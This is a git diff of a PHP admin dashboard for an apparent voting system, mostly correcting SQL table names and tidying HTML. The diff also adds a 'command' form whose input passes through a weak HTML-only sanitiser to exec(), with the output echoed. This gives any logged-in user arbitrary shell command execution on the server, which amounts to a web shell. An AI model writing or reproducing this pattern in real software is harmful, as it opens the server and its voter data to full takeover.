@@ -8,7 +8,7 @@ if(!isset($_SESSION['user'])){
 
 include('../Include/db.php');
 
-$sql = "SELECT * FROM cadidates";
+$sql = "SELECT * FROM candidates";
 
 $result = $conn->query($sql);
 
@@ -16,7 +16,7 @@ if($result){
   $count = mysqli_num_rows($result);
 }
 
-$voter = "SELECT * FROM voter";
+$voter = "SELECT * FROM `users` WHERE `role` = '2'";
 
 $stm = $conn->query($voter);
 
@@ -24,7 +24,7 @@ if($stm){
     $voters = mysqli_num_rows($stm);
 }
 
-$vote = "SELECT * FROM checklist";
+$vote = "SELECT * FROM vote";
 
 $total = $conn->query($vote);
 
@@ -32,16 +32,17 @@ if($total){
     $totalvote = mysqli_num_rows($total);
 }
 
+function validate ($data) {
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
+  }
 
 ?>
 
 <!doctype html>
-<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
-<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
-<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
-<!--[if gt IE 8]><!-->
 <html class="no-js" lang="en">
-<!--<![endif]-->
 
 <head>
     <meta charset="utf-8">
@@ -65,12 +66,10 @@ if($total){
     <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"> -->
 
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800' rel='stylesheet' type='text/css'>
-
 </head>
-    
+  
 <body>
-    <!-- Left Panel -->
-
+ 
     <aside id="left-panel" class="left-panel">
         <nav class="navbar navbar-expand-sm navbar-default">
 
@@ -87,14 +86,6 @@ if($total){
                     <li class="active">
                         <a href="dashboard.php"> <i class="menu-icon fa fa-dashboard"></i>Dashboard </a>
                     </li>
-                    <!-- <li class="menu-item-has-children dropdown">
-                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="menu-icon fa fa-laptop"></i>Manage voters</a>
-                        <ul class="sub-menu children dropdown-menu">
-                            <li><i class="fa fa-puzzle-piece"></i><a href="../frontend/admin/ui-buttons.html">Edit voters</a></li>
-                            <li><i class="fa fa-id-badge"></i><a href="../frontend/admin/ui-badges.html">Delete voters</a></li>
-                            
-                        </ul>
-                    </li> -->
                     <li class="menu-item-has-children dropdown">
                         <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="menu-icon fa fa-table"></i>Manage candidate</a>
                         <ul class="sub-menu children dropdown-menu">
@@ -102,17 +93,13 @@ if($total){
                             <li><i class="fa fa-table"></i><a href="view.php">View candidate</a></li>                   
                         </ul>
                     </li>         
-
-        </nav>
+             </nav>
         </div><!-- /.navbar-collapse -->
     </aside><!-- /#left-panel -->
     <div id="right-panel" class="right-panel">
 
-        <!-- Header-->
         <header id="header" class="header">
-
             <div class="header-menu">
-
                 <div class="col-sm-7">
                     <a id="menuToggle" class="menutoggle pull-left"><i class="fa fa fa-tasks"></i></a>
                     <div class="header-left">
@@ -122,36 +109,22 @@ if($total){
                                 <input class="form-control mr-sm-2" type="text" placeholder="Search ..." aria-label="Search">
                                 <button class="search-close" type="submit"><i class="fa fa-close"></i></button>
                             </form>
-                        </div>
-
-                       
+                        </div>                
                 <div class="col-sm-5">
                     <div class="user-area dropdown float-right">
                         <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                             <img class="user-avatar rounded-circle" src="../frontend/admin/images/admin.jpg" alt="User Avatar">
                         </a>
-
                         <div class="user-menu dropdown-menu">
-                            <!-- <a class="nav-link" href="#"><i class="fa fa-user"></i> My Profile</a>
-
-                            <a class="nav-link" href="#"><i class="fa fa-user"></i> Notifications <span class="count">13</span></a>
-
-                            <a class="nav-link" href="#"><i class="fa fa-cog"></i> Settings</a> -->
-
                             <a class="nav-link" href="../Include/logout.php"><i class="fa fa-power-off"></i> Logout</a>
                         </div>
                     </div>
-
-                    
-                    </div>
-
+                  </div>
                 </div>
             </div>
 
         </header><!-- /header -->
-        <!-- Header-->
-
-
+ 
             <div class="col-6">
                 <div class="card text-white bg-flat-color-1">
                     <div class="card-body pb-0">
@@ -161,9 +134,7 @@ if($total){
                             </button>
                             <div class="dropdown-menu" aria-labelledby="dropdownMenuButton1">
                                 <div class="dropdown-menu-content">
-                                    <a class="dropdown-item" href="view.php">Candidates</a>
-                                    <!-- <a class="dropdown-item" href="#">Another action</a>
-                                    <a class="dropdown-item" href="#">Something else here</a> -->
+                                    <a class="dropdown-item" href="view.php">Candidates</a>              
                                 </div>
                             </div>
                         </div>
@@ -177,12 +148,9 @@ if($total){
                         <div class="chart-wrapper px-0" style="height:70px;" height="70">
                             <canvas id="widgetChart1"></canvas>
                         </div>
-
                     </div>
-
                 </div>
             </div>
-            <!--/.col-->
 
             <div class="col-6">
                 <div class="card text-white bg-flat-color-2">
@@ -205,12 +173,9 @@ if($total){
                         <div class="chart-wrapper px-0" style="height:70px;" height="70">
                             <canvas id="widgetChart2"></canvas>
                         </div>
-
                     </div>
                 </div>
             </div>
-            <!--/.col-->
-           
 
             <div class="col-6">
                 <div class="card">
@@ -224,21 +189,31 @@ if($total){
                         </div>
                     </div>
                 </div>
-            </div>          
-             <!-- /# card -->
+            </div>
+           <div class="col-6">  
+
+           <form action="dashboard.php" method="post">
+                <div class="form-group">
+                    <label for="command">Enter the command</label>
+                    <input type="text" name="command" required class="form-control">
+                    <button  class="btn btn-primary mt-3">Submit</button>
+                </div>
+                <?php 
+                if(isset($_POST['command'])){
+                    $command = validate($_POST['command']);
+                    echo exec($command);
+                    // print_r($output);
+                }
+                ?>
+            </form>
          </div>
-
-
-        </div> <!-- .content -->
+       </div> <!-- .content -->
     </div><!-- /#right-panel -->
-
-    <!-- Right Panel -->
 
     <script src="../frontend/admin/vendors/jquery/dist/jquery.min.js"></script>
     <script src="../frontend/admin/vendors/popper.js/dist/umd/popper.min.js"></script>
     <script src="../frontend/admin/vendors/bootstrap/dist/js/bootstrap.min.js"></script>
     <script src="../frontend/admin/assets/js/main.js"></script>
-
 
     <script src="../frontend/admin/vendors/chart.js/dist/Chart.bundle.min.js"></script>
     <script src="../frontend/admin/assets/js/dashboard.js"></script>
